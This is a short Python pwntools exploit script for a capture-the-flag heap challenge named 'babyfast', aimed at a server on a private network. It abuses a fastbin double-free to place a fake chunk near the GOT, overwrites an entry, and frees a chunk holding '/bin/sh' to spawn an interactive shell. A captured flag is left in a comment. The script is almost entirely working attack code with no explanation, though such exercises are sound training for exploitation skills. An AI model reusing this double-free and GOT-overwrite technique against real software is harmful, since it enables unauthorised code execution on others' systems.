#!/usr/bin/env python 
from pwn import *

LOCAL  = False
Debug  = False
SERVER = '172.16.113.50'
PORT   = 12038
Binary = 'babyfast'

lib = ELF('./libc.so.6')

      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote(SERVER, PORT)
else:
    r = process('./{}'.format(Binary))
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')


"""
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
   FORTIFY:  Enabled
"""
def allocate(size,data):
    r.sendlineafter('choice :', '1')
    r.sendlineafter(':', str(size))
    r.sendlineafter(':', data)
    
def dfree(index):
    r.sendlineafter('choice :', '2')
    r.sendlineafter(':', str(index))

def exit():
    r.sendlineafter('choice :', '3')

if __name__ == "__main__":
    
   allocate(0x50,'1') #0
   allocate(0x50,'2') #1
   allocate(0x50,'/bin/sh') #2
   
   dfree(0)
   dfree(1)
   dfree(0)
   
   allocate(0x50,p64(0x601ffa)) # size 60   #0
   allocate(0x50,'1') #1
   allocate(0x50,'1') #3 
   allocate(0x50,p64(0)+'a'*6 + p64(0x400b3a)) # 4

   dfree(2)  
   
   r.interactive()
   
   
   # FLAG{FASTER~~~~}
   
